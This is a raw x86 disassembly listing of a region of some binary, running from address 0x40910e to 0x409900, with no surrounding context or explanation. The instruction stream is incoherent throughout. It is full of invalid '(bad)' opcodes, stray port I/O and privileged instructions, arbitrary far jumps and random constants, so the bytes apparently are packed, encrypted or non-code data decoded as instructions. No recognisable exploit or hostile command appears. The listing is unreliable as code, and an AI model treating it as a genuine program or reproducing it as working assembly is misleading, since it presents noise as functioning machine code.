  40910e:	in     al,dx
  40910f:	rol    dh,cl
  409111:	adc    DWORD PTR [ebx+0x191cd55d],0x714b6825
  40911b:	push   edi
  40911c:	inc    ebx
  40911d:	xor    eax,edx
  40911f:	pushf  
  409120:	nop
  409121:	push   es
  409122:	pop    edx
  409123:	mov    cl,0x6a
  409125:	leave  
  409126:	(bad)  
  409127:	adc    BYTE PTR [esi-0x5d2549b9],ch
  40912d:	(bad)  
  40912e:	cmp    BYTE PTR [eax],dl
  409130:	xor    esp,DWORD PTR [ebx+0x5e]
  409133:	into   
  409134:	add    al,0x10
  409136:	push   ebx
  409137:	xor    ebp,DWORD PTR [ecx+eiz*2]
  40913a:	mov    dl,0x77
  40913c:	push   0x58
  40913e:	xchg   si,ax
  409140:	or     eax,0xa30750a9
  409145:	pop    esp
  409146:	mov    ah,BYTE PTR [edi+0x19]
  409149:	or     al,0x76
  40914b:	imul   edx,DWORD PTR [ecx],0xffffff92
  40914e:	retf   0xac5b
  409151:	ss in  eax,0x2d
  409154:	cmp    eax,0xfc477498
  409159:	popa   
  40915a:	bound  esp,QWORD PTR [edx-0x4c]
  40915d:	lods   eax,DWORD PTR ds:[esi]
  40915e:	in     al,0x40
  409160:	inc    eax
  409161:	jne    0x4091d8
  409163:	push   ds
  409164:	jmp    0x7133d0fb
  409169:	dec    edi
  40916a:	push   ebx
  40916b:	dec    edi
  40916c:	jmp    0xf239:0x10754f3
  409173:	dec    ebx
  409174:	jmp    0xcba1:0x588475e0
  40917b:	pop    ss
  40917c:	lahf   
  40917d:	or     al,0x63
  40917f:	outs   dx,DWORD PTR ds:[esi]
  409180:	mov    DWORD PTR [ecx],eax
  409182:	push   0xeb2c7261
  409187:	mov    eax,ds:0xd5846cc0
  40918c:	enter  0x620,0x17
  409190:	int    0xd1
  409192:	fisubr WORD PTR [esi]
  409194:	sbb    DWORD PTR [eax-0x2d42ab9c],0x27ee17e9
  40919e:	xor    DWORD PTR [esi+edi*4+0x2],0xffffffd6
  4091a3:	data16 jbe 0x4091f4
  4091a6:	js     0x4091d0
  4091a8:	push   ebx
  4091a9:	xchg   esp,eax
  4091aa:	and    eax,0xb939f540
  4091af:	scas   eax,DWORD PTR es:[edi]
  4091b0:	adc    dh,BYTE PTR [edi-0x3a157029]
  4091b6:	xchg   DWORD PTR [ecx-0x79],esi
  4091b9:	inc    edx
  4091ba:	cld    
  4091bb:	and    BYTE PTR [esi-0x59405e56],cl
  4091c1:	push   0x8fd8d85f
  4091c6:	ins    DWORD PTR es:[edi],dx
  4091c7:	fs ret 
  4091c9:	xchg   ecx,eax
  4091ca:	xchg   edi,eax
  4091cb:	das    
  4091cc:	lea    esp,[eax]
  4091ce:	outs   dx,BYTE PTR ds:[esi]
  4091cf:	mov    al,ds:0x27838a59
  4091d4:	rcr    BYTE PTR [ebx+0x58e9d498],cl
  4091da:	iret   
  4091db:	pop    edi
  4091dc:	or     ah,cl
  4091de:	cmp    edi,esp
  4091e0:	jge    0x4091c9
  4091e2:	out    0x64,al
  4091e4:	stos   BYTE PTR es:[edi],al
  4091e5:	pushf  
  4091e6:	fbld   TBYTE PTR [edx]
  4091e8:	sub    DWORD PTR [ebx-0x2e],0xffffffe4
  4091ec:	fidivr DWORD PTR ds:0x5db88771
  4091f2:	ins    BYTE PTR es:[di],dx
  4091f4:	cwde   
  4091f5:	xchg   sp,ax
  4091f7:	int    0x1
  4091f9:	add    dh,BYTE PTR [edx]
  4091fb:	jg     0x409272
  4091fd:	xchg   esi,eax
  4091fe:	push   esp
  4091ff:	sub    edi,DWORD PTR [esi+edi*2]
  409202:	fadd   DWORD PTR [esi+esi*4-0x6e41c312]
  409209:	iret   
  40920a:	ins    DWORD PTR es:[edi],dx
  40920b:	jl     0x409284
  40920d:	adc    dh,cl
  40920f:	mov    WORD PTR [edx+0x4a15aa5e],cs
  409215:	cdq    
  409216:	cmp    eax,0xde8079af
  40921b:	cmp    dh,BYTE PTR [edi+0x7b]
  40921e:	call   0x707f:0xe73bc1dc
  409225:	sub    ch,BYTE PTR [esp+ebx*1]
  409228:	cmp    eax,DWORD PTR [ebx-0x46]
  40922b:	and    eax,0xd0f43ef6
  409230:	mov    eax,0x762f1a51
  409235:	addr16 aas 
  409237:	rol    BYTE PTR [edi+0x2e],0x10
  40923b:	mov    ds:0x830b040d,eax
  409240:	inc    ebx
  409241:	dec    edx
  409242:	scas   al,BYTE PTR es:[edi]
  409243:	mov    al,ds:0xd9b2c6be
  409248:	sbb    DWORD PTR gs:[ebp+0x35],esp
  40924c:	fwait
  40924d:	je     0x409242
  40924f:	icebp  
  409250:	div    BYTE PTR [ebp+0x77]
  409253:	mov    dl,0x3f
  409255:	inc    esi
  409256:	lods   al,BYTE PTR ds:[esi]
  409257:	mov    edx,0x3b900eb9
  40925d:	push   es
  40925e:	xor    ebp,DWORD PTR [eax-0x7c]
  409261:	cmp    BYTE PTR [edi-0x7b24372b],ch
  409267:	mov    cl,0x28
  409269:	mov    edi,0x73ef3
  40926e:	dec    esi
  40926f:	add    DWORD PTR [ebp+0x3a],ecx
  409272:	call   0x41a1:0x96169725
  409279:	ss enter 0x517d,0xab
  40927e:	sub    al,0x5e
  409280:	and    BYTE PTR [esi-0x35],bh
  409283:	adc    al,0x6
  409285:	inc    edx
  409286:	in     eax,0xfb
  409288:	mov    BYTE PTR [ebp-0x20],dl
  40928b:	imul   edx,DWORD PTR [ebx-0x35],0xffffff9d
  40928f:	add    bl,ch
  409291:	out    dx,al
  409292:	or     DWORD PTR [ebp-0x6e],ecx
  409295:	daa    
  409296:	dec    esp
  409297:	(bad)  
  409299:	scas   eax,DWORD PTR es:[edi]
  40929a:	add    eax,DWORD PTR [esi]
  40929c:	into   
  40929d:	mov    eax,0x618eaddd
  4092a2:	pop    ecx
  4092a3:	(bad)  
  4092a4:	lods   al,BYTE PTR ds:[esi]
  4092a5:	ret    
  4092a6:	pusha  
  4092a7:	enter  0x3496,0x1b
  4092ab:	jns    0x4092fa
  4092ad:	dec    esi
  4092ae:	pop    ebx
  4092af:	add    ebx,DWORD PTR [ebx+0x53607822]
  4092b5:	das    
  4092b6:	xor    ecx,DWORD PTR [edi+eax*4+0x2c6f7a5c]
  4092bd:	cmp    BYTE PTR [eax+0x79041461],ch
  4092c3:	or     al,ah
  4092c5:	pusha  
  4092c6:	clc    
  4092c7:	xchg   BYTE PTR [ecx],bh
  4092c9:	dec    eax
  4092ca:	outs   dx,BYTE PTR ds:[esi]
  4092cb:	lds    ecx,FWORD PTR [ecx+0x76c2d883]
  4092d1:	xor    DWORD PTR ds:0xf71089db,esi
  4092d7:	mov    edx,0x2fd3d408
  4092dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092dd:	mov    BYTE PTR [ebp+0x63396c85],al
  4092e3:	push   edx
  4092e4:	and    ecx,esp
  4092e6:	jb     0x409350
  4092e8:	or     dh,0xa1
  4092eb:	aam    0xc3
  4092ed:	or     eax,0x4490bf2c
  4092f2:	jg     0x4092ce
  4092f4:	ja     0x409295
  4092f6:	adc    ch,cl
  4092f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f9:	jle    0x409349
  4092fb:	loope  0x409300
  4092fd:	cmp    eax,0x7d48bcf1
  409302:	retf   0xa532
  409305:	xor    DWORD PTR [ecx+esi*2],ebp
  409308:	dec    eax
  409309:	or     bl,ah
  40930b:	repz and ah,BYTE PTR [esi-0x6c]
  40930f:	ret    0x77e1
  409312:	psubusw mm6,mm7
  409315:	test   al,0x76
  409317:	cmc    
  409318:	cmp    BYTE PTR [eax+0x68],bh
  40931b:	imul   esp,DWORD PTR [ebx],0x818f490d
  409321:	push   0x69830098
  409326:	push   cs
  409327:	cli    
  409328:	xor    BYTE PTR [edi],cl
  40932a:	jmp    0x40937f
  40932c:	lea    esi,[eax-0x62d7a874]
  409332:	sub    BYTE PTR [ecx+0x71],bl
  409335:	das    
  409336:	in     al,0x11
  409338:	xor    ah,ah
  40933a:	xor    eax,esp
  40933c:	xor    DWORD PTR [ebx],edi
  40933e:	pop    ebp
  40933f:	fisttp WORD PTR [ecx+0x31]
  409342:	push   esp
  409343:	dec    esi
  409344:	sub    DWORD PTR [edx+0x53],0x24baff20
  40934b:	ret    0xe08c
  40934e:	cmp    dh,ah
  409350:	scas   al,BYTE PTR es:[edi]
  409351:	push   esp
  409352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409353:	std    
  409354:	sbb    cl,BYTE PTR [eax+0x79]
  409357:	aad    0xa3
  409359:	std    
  40935a:	int3   
  40935b:	sbb    eax,eax
  40935d:	cdq    
  40935e:	loop   0x409385
  409360:	dec    esi
  409361:	mov    ds:0x94692311,eax
  409366:	daa    
  409367:	das    
  409368:	jo     0x4093a9
  40936a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40936b:	das    
  40936c:	mov    bl,0x1
  40936e:	xchg   DWORD PTR [edx+eiz*1+0xbf081fa],edx
  409375:	xor    al,0xaf
  409377:	jne    0x4093d1
  409379:	in     al,0x65
  40937b:	adc    bl,BYTE PTR [esi-0x52730f98]
  409381:	inc    edi
  409382:	jns    0x40932a
  409384:	jg     0x4093cb
  409386:	cli    
  409387:	jbe    0x4093d8
  409389:	dec    ebx
  40938a:	push   esi
  40938b:	fwait
  40938c:	add    DWORD PTR [ebx+0x12],edi
  40938f:	cmp    BYTE PTR [edx],ch
  409391:	dec    edx
  409392:	sbb    al,0x67
  409394:	pop    ss
  409395:	fisubr WORD PTR [edi+0x42]
  409398:	sub    DWORD PTR ds:0xd8e3dc2d,0x2f
  40939f:	jmp    0x4093a2
  4093a1:	jmp    0x9b22:0x60f90bee
  4093a8:	pop    ecx
  4093a9:	push   ss
  4093aa:	retf   0x7628
  4093ad:	dec    esp
  4093ae:	cmp    bh,BYTE PTR [eax+0x48612e60]
  4093b4:	push   ds
  4093b5:	push   eax
  4093b6:	cld    
  4093b7:	xor    al,0xe8
  4093b9:	sbb    eax,0xd6e21a30
  4093be:	cmp    al,0x24
  4093c0:	mov    dl,0x6f
  4093c2:	dec    ebp
  4093c3:	jge    0x409352
  4093c5:	daa    
  4093c6:	xchg   DWORD PTR [eax-0x2e8c65e0],edi
  4093cc:	pop    eax
  4093cd:	push   ds
  4093ce:	repz xlat BYTE PTR ds:[ebx]
  4093d0:	dec    eax
  4093d1:	jns    0x409365
  4093d3:	sbb    DWORD PTR ss:[ecx-0x2654836],0xffffff85
  4093db:	mov    bl,0x62
  4093dd:	dec    esp
  4093de:	cli    
  4093df:	fisubr DWORD PTR [ebx]
  4093e1:	addr16 aas 
  4093e3:	adc    BYTE PTR [edx-0x44],bl
  4093e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093e7:	cmp    DWORD PTR [edx+0x3ec9ca68],0x3ab1d63a
  4093f1:	jecxz  0x40945d
  4093f3:	sub    eax,0x1ec943ef
  4093f8:	out    0xef,eax
  4093fa:	jle    0x409384
  4093fc:	cmp    al,0xdd
  4093fe:	pop    esi
  4093ff:	test   DWORD PTR [edx+0x5a3084e1],edi
  409405:	cmc    
  409406:	add    eax,ebx
  409408:	add    edx,DWORD PTR [ecx+ebx*4+0x36]
  40940c:	sub    eax,0x29916505
  409411:	xor    eax,0xdf73fd4f
  409416:	aam    0x56
  409418:	call   0x4f30:0x8cc1e37f
  40941f:	adc    esi,DWORD PTR [ecx]
  409421:	int    0x25
  409423:	fwait
  409424:	lds    edx,FWORD PTR [eax]
  409426:	xor    DWORD PTR [edx*1-0xc9aed1d],eax
  40942d:	lods   eax,DWORD PTR ds:[esi]
  40942e:	cli    
  40942f:	arpl   WORD PTR [ecx],di
  409431:	shr    dh,1
  409433:	aam    0xca
  409435:	push   ss
  409436:	aam    0x4f
  409438:	outs   dx,BYTE PTR ds:[esi]
  409439:	or     bl,BYTE PTR [edi+ebx*8+0x13b320c2]
  409440:	js     0x4094bf
  409442:	scas   al,BYTE PTR es:[edi]
  409443:	or     al,BYTE PTR [edi+edi*2]
  409446:	sbb    al,0x5
  409448:	enter  0x7f1,0xdb
  40944c:	xchg   DWORD PTR [ecx],esi
  40944e:	mov    bh,0x84
  409450:	mov    al,ds:0xafb5cd00
  409455:	ins    DWORD PTR es:[edi],dx
  409456:	sub    eax,0xb1e5eda8
  40945b:	adc    dl,ah
  40945d:	mov    WORD PTR [ebx+0x6c],gs
  409460:	sub    esi,DWORD PTR [ebx+edx*4]
  409463:	push   ss
  409464:	cmp    BYTE PTR [ebx+0x4a60d2ff],0xc1
  40946b:	xlat   BYTE PTR ds:[ebx]
  40946c:	and    al,0xba
  40946e:	jno    0x40942b
  409470:	adc    BYTE PTR [ebx+0x5b0d0320],0xa7
  409477:	cmp    BYTE PTR [ecx+0x252e951c],0x76
  40947e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409480:	fdivr  DWORD PTR [edx-0x6da85d12]
  409486:	repnz icebp 
  409488:	leave  
  409489:	aad    0x9
  40948b:	push   esi
  40948c:	arpl   WORD PTR [eax-0x35],sp
  40948f:	pop    esi
  409490:	xchg   esi,eax
  409491:	push   ss
  409492:	xchg   ecx,eax
  409493:	jmp    0x40947b
  409495:	sub    esp,DWORD PTR [ebx+edx*4+0x2d25ea61]
  40949c:	fdiv   DWORD PTR [eax+ecx*2-0x4c]
  4094a0:	mov    edx,0x8a88c0de
  4094a5:	xchg   edx,eax
  4094a6:	imul   esi,DWORD PTR [edi],0x74622a9
  4094ac:	(bad)  
  4094ad:	xlat   BYTE PTR ds:[ebx]
  4094ae:	xchg   ebp,eax
  4094af:	not    DWORD PTR [ecx+0x3eaa759a]
  4094b5:	jecxz  0x40947f
  4094b7:	push   ebp
  4094b8:	adc    dh,BYTE PTR [edx+0x6fb5f799]
  4094be:	adc    bl,al
  4094c0:	ss push 0x52
  4094c3:	or     BYTE PTR [ebx],0x28
  4094c6:	fnsave ds:0x2bf0830e
  4094cc:	inc    esp
  4094cd:	std    
  4094ce:	jl     0x40953f
  4094d0:	inc    ebp
  4094d1:	inc    ebx
  4094d2:	lds    esp,FWORD PTR [ebx]
  4094d4:	mov    ecx,0x1a51bd1e
  4094d9:	ret    
  4094da:	sbb    eax,0x53e5cca4
  4094df:	dec    ebp
  4094e0:	mov    ch,0xc7
  4094e2:	out    0x7d,eax
  4094e4:	stos   DWORD PTR es:[edi],eax
  4094e5:	(bad)  
  4094e6:	aas    
  4094e7:	aam    0x53
  4094e9:	stos   DWORD PTR es:[edi],eax
  4094ea:	sbb    BYTE PTR [esi+0x1d],al
  4094ed:	mov    dh,0x39
  4094ef:	sub    edi,DWORD PTR [esi-0x7c7d88f4]
  4094f5:	xchg   ecx,eax
  4094f6:	sbb    eax,0xd9fd95ef
  4094fb:	mov    dh,0x94
  4094fd:	jb     0x409521
  4094ff:	arpl   si,ax
  409501:	jno    0x409503
  409503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409504:	mov    es,esi
  409506:	inc    esp
  409507:	cmp    ecx,DWORD PTR [ecx-0x5e]
  40950a:	pop    ebp
  40950b:	inc    esp
  40950c:	ror    BYTE PTR [edx],1
  40950e:	jl     0x40957b
  409510:	cs mul bh
  409513:	in     eax,dx
  409514:	sub    dh,BYTE PTR [ecx-0x37d3e43b]
  40951a:	in     al,dx
  40951b:	test   eax,0x9e3481d5
  409520:	sbb    BYTE PTR [edx],bh
  409522:	jmp    0x36d3:0xe8b580fd
  409529:	outs   dx,DWORD PTR ds:[esi]
  40952a:	cwde   
  40952b:	and    BYTE PTR [esi+0x52],cl
  40952e:	(bad)  
  40952f:	dec    ebx
  409530:	bound  esi,QWORD PTR [eax]
  409532:	loopne 0x409554
  409534:	adc    esi,DWORD PTR [ebx+eax*2+0x76]
  409538:	(bad)  
  409539:	add    al,0x15
  40953b:	js     0x40956c
  40953d:	mov    al,ds:0x2549d9b
  409542:	inc    esp
  409543:	jp     0x409595
  409545:	mov    ebx,0x47aea5fe
  40954a:	ror    edx,1
  40954c:	xchg   DWORD PTR [ebx-0x31f640ae],edi
  409552:	fwait
  409553:	or     al,0xdc
  409555:	(bad)  
  409556:	jo     0x40958a
  409558:	(bad)
  40955e:	xor    DWORD PTR [ebx],0xe88f4d77
  409564:	sub    DWORD PTR [ecx-0x140bb3f1],esp
  40956a:	jecxz  0x4095e1
  40956c:	pop    ebx
  40956d:	add    esp,eax
  40956f:	mov    cl,0x76
  409571:	mov    al,BYTE PTR [ecx+0x323aef45]
  409577:	xor    edx,0xffffff91
  40957a:	(bad)  
  40957b:	icebp  
  40957c:	pop    ebx
  40957d:	in     al,0xf0
  40957f:	test   BYTE PTR [edi+0x36],cl
  409582:	sbb    esp,ebx
  409584:	cmp    eax,0x4de0e201
  409589:	not    edi
  40958b:	adc    ebx,ebx
  40958d:	mov    edi,0x840b5266
  409592:	inc    esp
  409593:	mov    DWORD PTR [ecx-0xf],0x70ad6841
  40959a:	jl     0x409598
  40959c:	pop    esp
  40959d:	cmp    al,0x39
  40959f:	pushf  
  4095a0:	xor    dl,BYTE PTR [ebp+0x2386e41]
  4095a6:	push   ss
  4095a7:	rcr    BYTE PTR [edi+ebp*4+0x1c],1
  4095ab:	cdq    
  4095ac:	mov    bh,0x5a
  4095ae:	cmc    
  4095af:	mov    eax,0xa101bf82
  4095b4:	xchg   esi,eax
  4095b5:	xor    al,BYTE PTR [edx+0x5]
  4095b8:	stc    
  4095b9:	xor    eax,0x720d6a6
  4095be:	pusha  
  4095bf:	(bad)  
  4095c0:	dec    edi
  4095c1:	sahf   
  4095c2:	ret    
  4095c3:	pushf  
  4095c4:	cmp    BYTE PTR [ecx-0x205f25e8],cl
  4095ca:	loope  0x4095b7
  4095cc:	ss aam 0x58
  4095cf:	jmp    0x409619
  4095d1:	push   ebx
  4095d2:	jge    0x409575
  4095d4:	or     al,0x13
  4095d6:	push   ebx
  4095d7:	jmp    0x7152:0x6ab86398
  4095de:	push   esi
  4095df:	dec    esi
  4095e0:	sub    al,0x45
  4095e2:	les    esi,FWORD PTR ds:[eax]
  4095e5:	sbb    al,0x2d
  4095e7:	inc    esi
  4095e8:	mov    al,ds:0x7e84a5d2
  4095ed:	outs   dx,DWORD PTR ds:[esi]
  4095ee:	inc    esi
  4095ef:	scas   al,BYTE PTR es:[edi]
  4095f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f1:	sbb    bl,BYTE PTR [eax]
  4095f3:	push   cs
  4095f4:	test   BYTE PTR [edx+edx*2],ah
  4095f7:	xlat   BYTE PTR ds:[ebx]
  4095f8:	mov    ebx,0x8d43d639
  4095fd:	cmp    esi,DWORD PTR [ebx+0x17ee5a10]
  409603:	push   cs
  409604:	lods   eax,DWORD PTR ds:[esi]
  409605:	inc    edi
  409606:	cmp    al,0xd4
  409608:	repnz bound ebx,QWORD PTR [edi-0x911a820]
  40960f:	and    ebp,edx
  409611:	xchg   DWORD PTR [eax],eax
  409613:	cs aas 
  409615:	inc    esi
  409616:	clc    
  409617:	not    BYTE PTR [ebx-0x58]
  40961a:	mov    cl,0x8a
  40961c:	scas   al,BYTE PTR es:[edi]
  40961d:	sbb    ebp,DWORD PTR [eax-0x533aad4b]
  409623:	addr16 adc bh,0x8d
  409627:	mov    esp,DWORD PTR [edi]
  409629:	add    eax,0x685a392a
  40962e:	pop    eax
  40962f:	push   ss
  409630:	push   0xf50d98d5
  409635:	jl     0x409604
  409637:	push   es
  409638:	add    ch,dh
  40963a:	test   al,0x3c
  40963c:	icebp  
  40963d:	and    ebx,0x1835ff97
  409643:	sub    al,0x47
  409645:	arpl   WORD PTR [ebp-0x28],bx
  409648:	shl    DWORD PTR [ecx+0x69],1
  40964b:	xlat   BYTE PTR ds:[ebx]
  40964c:	adc    eax,0x103deeba
  409651:	xor    esp,DWORD PTR [edi+0x5c]
  409654:	fsubr  st(1),st
  409656:	sahf   
  409657:	lock sub eax,0xc88f5bb3
  40965d:	sbb    ch,BYTE PTR [ebp-0x18]
  409660:	sub    ebx,DWORD PTR [esi+ebp*4+0x2a9a39e8]
  409667:	dec    ecx
  409668:	test   DWORD PTR [edx+0x2f],esi
  40966b:	mov    al,ds:0x13c6dbf1
  409670:	leave  
  409671:	lods   al,BYTE PTR ds:[esi]
  409672:	popa   
  409673:	pop    es
  409674:	ins    BYTE PTR es:[edi],dx
  409675:	in     al,dx
  409676:	xor    esi,esi
  409678:	pop    ecx
  409679:	test   eax,0x1d4e7a23
  40967e:	dec    eax
  40967f:	fist   WORD PTR [edx-0x40]
  409682:	lods   al,BYTE PTR ds:[esi]
  409683:	dec    edi
  409684:	xlat   BYTE PTR ds:[ebx]
  409685:	sub    ecx,ecx
  409687:	jge    0x40961e
  409689:	shr    ch,0x7f
  40968c:	test   BYTE PTR [eax-0x20ebe9b5],ah
  409692:	bound  esi,QWORD PTR [eax]
  409694:	daa    
  409695:	push   ebp
  409696:	rol    BYTE PTR [edi],0xb
  409699:	mov    bh,0x3
  40969b:	fild   QWORD PTR [ecx-0x4f]
  40969e:	add    al,dh
  4096a0:	pop    ebx
  4096a1:	jno    0x4096dc
  4096a3:	cmp    BYTE PTR [edi+ecx*4],0x3f
  4096a7:	pop    esp
  4096a8:	cmp    al,BYTE PTR [esi+0x41]
  4096ab:	js     0x409709
  4096ad:	xchg   BYTE PTR [eax-0x78b9dd40],bl
  4096b3:	ja     0x409683
  4096b5:	or     eax,0xa29a797b
  4096ba:	mov    edx,0xf1eef93
  4096bf:	in     al,dx
  4096c0:	call   0xad7a7daf
  4096c5:	xchg   edi,eax
  4096c6:	push   cs
  4096c7:	inc    ecx
  4096c8:	adc    BYTE PTR [ecx],cl
  4096ca:	ja     0x409656
  4096cc:	ds scas eax,DWORD PTR es:[edi]
  4096ce:	and    DWORD PTR [ebp*1+0x647b456a],ebp
  4096d5:	xor    DWORD PTR [edx+0xf],edi
  4096d8:	in     eax,dx
  4096d9:	dec    edi
  4096da:	cmp    eax,0x6a3d5909
  4096df:	xchg   ecx,eax
  4096e0:	mov    eax,ds:0x30c4164e
  4096e5:	(bad)
  4096e9:	mov    esp,0xf0f54f01
  4096ee:	dec    esi
  4096ef:	dec    edi
  4096f0:	push   es
  4096f1:	sbb    BYTE PTR ds:0xd62b8bfc,0x4b
  4096f8:	loopne 0x4096a6
  4096fa:	(bad)  
  4096fb:	stc    
  4096fc:	repnz and eax,0xfd176a6e
  409702:	int    0x21
  409704:	dec    eax
  409705:	pop    edi
  409706:	jle    0x4096b2
  409708:	fnsave [ecx]
  40970a:	test   al,0xd0
  40970c:	repz call 0xf29b3e35
  409712:	fmulp  st(4),st
  409714:	sbb    bh,0xaf
  409717:	push   es
  409718:	cmp    ah,ah
  40971a:	out    0x70,al
  40971c:	mov    ch,0xca
  40971e:	pop    es
  40971f:	das    
  409720:	mov    bh,0x8
  409722:	cs inc ebp
  409724:	cld    
  409725:	xor    al,0xf6
  409727:	jl     0x4096b5
  409729:	adc    eax,0x910db682
  40972e:	dec    edx
  40972f:	and    BYTE PTR [ebp+0x6436f9f8],0x40
  409736:	pop    edi
  409737:	mov    bl,0x34
  409739:	fnstcw WORD PTR [ecx+ebx*1]
  40973c:	or     dh,BYTE PTR [eax]
  40973e:	(bad)  
  40973f:	out    0xf2,al
  409741:	sbb    DWORD PTR [ebp+edi*4+0x1ff78ba0],edx
  409748:	sbb    BYTE PTR [edi],0x1f
  40974b:	xchg   esp,eax
  40974c:	xchg   edi,eax
  40974d:	mov    ebp,0xe72ae5ae
  409752:	jne    0x409766
  409754:	cmp    BYTE PTR [ecx+0x14],0x45
  409758:	cwde   
  409759:	aam    0xc3
  40975b:	(bad)  
  40975c:	mov    ah,0x22
  40975e:	mov    al,0xd1
  409760:	xor    edi,DWORD PTR [esi]
  409762:	mov    eax,ds:0xe8aac954
  409767:	clc    
  409768:	in     al,dx
  409769:	and    BYTE PTR [esp+edi*1+0x35044d09],0x32
  409771:	mov    DWORD PTR [ecx+0x1549cbf2],edx
  409777:	repnz mov al,ds:0x14a85835
  40977d:	mov    ch,0xa
  40977f:	leave  
  409780:	lods   al,BYTE PTR ds:[esi]
  409781:	jge    0x4097a7
  409783:	out    0x24,eax
  409785:	gs mov esi,0xf79345c0
  40978b:	fbstp  TBYTE PTR [esi]
  40978d:	in     eax,dx
  40978e:	hlt    
  40978f:	dec    ebp
  409790:	or     ebx,DWORD PTR [ebp+ebx*8-0x13]
  409794:	xlat   BYTE PTR ds:[ebx]
  409795:	fsub   DWORD PTR [ecx]
  409797:	loop   0x40978b
  409799:	jo     0x409808
  40979b:	sbb    eax,0xffe05a36
  4097a0:	or     cl,BYTE PTR [esi]
  4097a2:	adc    eax,DWORD PTR [edi-0x2984c49e]
  4097a8:	push   0xd17cda7c
  4097ad:	out    dx,al
  4097ae:	retf   
  4097af:	lods   al,BYTE PTR ds:[esi]
  4097b0:	sub    DWORD PTR [esi-0x33d5669d],esp
  4097b6:	stos   BYTE PTR es:[edi],al
  4097b7:	push   DWORD PTR [edx]
  4097b9:	ret    0xac7c
  4097bc:	xor    eax,0x564a62d4
  4097c1:	pop    edx
  4097c2:	push   ss
  4097c3:	push   ss
  4097c4:	gs aad 0x9e
  4097c7:	xor    edx,DWORD PTR [eax-0x3073c98]
  4097cd:	scas   eax,DWORD PTR es:[edi]
  4097ce:	loope  0x4097ea
  4097d0:	inc    esi
  4097d1:	(bad)
  4097d4:	pushf  
  4097d5:	out    0xbf,eax
  4097d7:	mov    dh,0xa3
  4097d9:	pushf  
  4097da:	mov    dl,0x9b
  4097dc:	arpl   ax,sp
  4097de:	and    al,0x87
  4097e0:	sub    eax,0xffffffad
  4097e3:	test   BYTE PTR [edx+ebx*8-0x43b00b04],ah
  4097ea:	push   cs
  4097eb:	dec    edi
  4097ec:	sbb    esp,esi
  4097ee:	inc    BYTE PTR ds:0x293477b1
  4097f4:	mov    edi,0xce803e6f
  4097f9:	xchg   edx,eax
  4097fa:	popf   
  4097fb:	ror    BYTE PTR [esi-0xc36d0ce],1
  409801:	jl     0x409847
  409803:	(bad)  
  409804:	fwait
  409805:	mov    DWORD PTR [edx-0x6],esi
  409808:	adc    esi,0xffffffc5
  40980b:	xchg   edx,eax
  40980c:	sbb    eax,0xa9b696ea
  409811:	jle    0x409821
  409813:	adc    eax,0x7a4a23dd
  409818:	mov    al,0x52
  40981a:	js     0x4097b1
  40981c:	sbb    al,0xf6
  40981e:	inc    ecx
  40981f:	jnp    0x4097a8
  409821:	retf   0x772b
  409824:	xor    eax,0xc448067c
  409829:	or     cl,BYTE PTR [edi+0x2a]
  40982c:	xor    al,0x32
  40982e:	cmp    esi,esi
  409830:	in     al,0x7b
  409832:	sub    DWORD PTR [eax],esp
  409834:	mov    ebp,0x8d1cfa2f
  409839:	(bad)  
  40983a:	enter  0x470f,0xf
  40983e:	mov    ds:0xd41e712f,al
  409843:	cmp    ch,BYTE PTR [esi+0x71]
  409846:	add    DWORD PTR [edi+0x75],0xffffffc9
  40984a:	stc    
  40984b:	push   esi
  40984c:	mov    eax,ds:0x857481b1
  409851:	pusha  
  409852:	xchg   edi,eax
  409853:	hlt    
  409854:	or     al,0x30
  409856:	cmp    DWORD PTR [esi],ecx
  409858:	dec    ebx
  409859:	pop    ecx
  40985a:	dec    ebx
  40985b:	sbb    ah,ah
  40985d:	mov    eax,ds:0x5014bb2a
  409862:	mov    al,0x1
  409864:	mov    BYTE PTR [ecx],dl
  409866:	sbb    eax,0x2258c01b
  40986b:	pop    ecx
  40986c:	fistp  WORD PTR ds:0xc8695409
  409872:	sbb    al,0x26
  409874:	retf   0xfbb6
  409877:	mov    esi,0xdba10761
  40987c:	mov    cl,0x8c
  40987e:	out    dx,eax
  40987f:	adc    DWORD PTR [ebp-0x7e],0x84260a06
  409886:	mov    DWORD PTR [eax],esp
  409888:	ins    DWORD PTR es:[edi],dx
  409889:	sahf   
  40988a:	xchg   edx,eax
  40988b:	add    eax,0xfceceb18
  409890:	jecxz  0x409859
  409892:	sub    eax,DWORD PTR [ebp+0x1f]
  409895:	xchg   ecx,eax
  409896:	mov    ebp,0x2169b9a
  40989b:	inc    ebx
  40989c:	push   ebp
  40989d:	in     eax,dx
  40989e:	mov    ch,0x35
  4098a0:	mov    ecx,0xacc30bf7
  4098a5:	adc    dl,BYTE PTR [ebx]
  4098a7:	mov    edi,0xec8017b9
  4098ac:	imul   ebx,DWORD PTR [edi+0x410c4531],0x1cd8fc73
  4098b6:	clc    
  4098b7:	cmp    al,0xf6
  4098b9:	lods   al,BYTE PTR ds:[esi]
  4098ba:	or     BYTE PTR [esi-0x3a5cdc17],bl
  4098c0:	loopne 0x409919
  4098c2:	or     cl,bl
  4098c4:	cmp    ecx,DWORD PTR [esi]
  4098c6:	xor    cl,0xeb
  4098c9:	xchg   ebp,eax
  4098ca:	mov    eax,ds:0xde1ad31b
  4098cf:	xchg   DWORD PTR [ecx+0x6dff7a41],eax
  4098d5:	push   ebp
  4098d6:	stos   BYTE PTR es:[edi],al
  4098d7:	xor    dh,BYTE PTR [ebp+ebx*2-0x21]
  4098db:	mov    esi,0x86a383e5
  4098e0:	test   DWORD PTR [edi-0x19],ebx
  4098e3:	adc    eax,0xaa15a112
  4098e8:	pop    esi
  4098e9:	(bad)  
  4098eb:	(bad)  
  4098ed:	mov    ebx,0xa6a6fd5c
  4098f2:	pop    eax
  4098f3:	add    BYTE PTR [eax],bl
  4098f5:	sbb    al,0xa3
  4098f7:	outs   dx,DWORD PTR ds:[esi]
  4098f8:	fsub   st,st(0)
  4098fa:	in     al,dx
  4098fb:	push   ebp
  4098fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098fd:	shl    DWORD PTR [eax],0x19
  409900:	es in  al,0xdf
